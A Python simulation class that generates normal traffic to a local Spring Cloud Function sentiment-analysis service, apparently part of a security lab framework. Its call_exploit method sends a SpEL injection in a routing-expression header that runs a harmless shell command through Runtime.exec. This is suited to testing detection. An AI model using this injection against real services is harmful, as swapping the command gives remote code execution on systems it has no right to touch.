from models.base_simulation import BaseSimulation
import os, asyncio, random, requests
from pathlib import Path

class SENTIMENTANALYZER(BaseSimulation):
    def __init__(self):
        super().__init__()
        self.url = 'http://localhost:8080'

    def setup(self):
        pass

    def name(self) -> str:
        return 'SENTIMENT_ANALYZER'

    def get_data_dir(self):
        return 'sentiment_analyzer'

    async def worker(self, session):
        await asyncio.sleep(random.uniform(0, 5))
        headers = {
            'spring.cloud.function.definition': 'analyzeAndUploadTxt',
            'Content-Type': 'text/plain'
        }

        dataDir = Path.cwd() / 'scenarios' / 'sentiment_analyzer' / 'sim' / 'comments'
        files = [f'{dataDir}/{f}' for f in os.listdir(dataDir) if os.path.isfile(os.path.join(dataDir, f))]
        filePath = random.choice(files)
        with open(filePath, 'rb') as f:
            async with session.post(self.url, data=f, headers=headers) as response:
                await response.text()

    def call_exploit(self):
        headers = {
            'Host': 'localhost:8080',
            'spring.cloud.function.routing-expression': "T(java.lang.Runtime).getRuntime().exec('touch /tmp/test && rm /tmp/test')"
        }

        url = f'{self.url}/functionRouter'
        requests.post(url, headers=headers, data='exploit_poc')

    def cleanup(self):
        pass
